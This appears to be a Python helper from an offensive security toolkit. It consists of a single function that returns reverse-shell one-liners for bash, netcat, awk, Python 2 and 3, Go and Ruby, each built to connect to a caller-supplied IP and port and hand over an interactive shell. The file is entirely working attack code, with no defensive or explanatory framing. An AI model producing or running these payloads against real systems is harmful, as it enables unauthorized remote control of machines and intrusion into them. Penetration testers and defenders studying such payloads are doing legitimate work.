def revshell(shell_type, ip, port, shell="/bin/bash"):
    if shell_type == "bash":
        return f"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif shell_type == "nc":
        return f"nc {ip} {port} -e {shell}"
    elif shell_type == "awk":
        return "awk 'BEGIN {s = \"/inet/tcp/0/" + ip + "/" + port + "; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
    elif shell_type == "python2":
        return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + '",' + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"" + shell + "\",\"-i\"])'"
    elif shell_type == "python3":
        return "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + '",' + port + '));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("' + shell + "\")'"
    elif shell_type == "golang":
        return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + ip + ':' + port + "\");cmd:=exec.Command(\"" + shell + "\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
    elif shell_type == "ruby":
        return "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ').to_i;exec sprintf("' + shell + " -i <&%d >&%d 2>&%d\",f,f,f)'"
    else:
        print("[!] Not found")
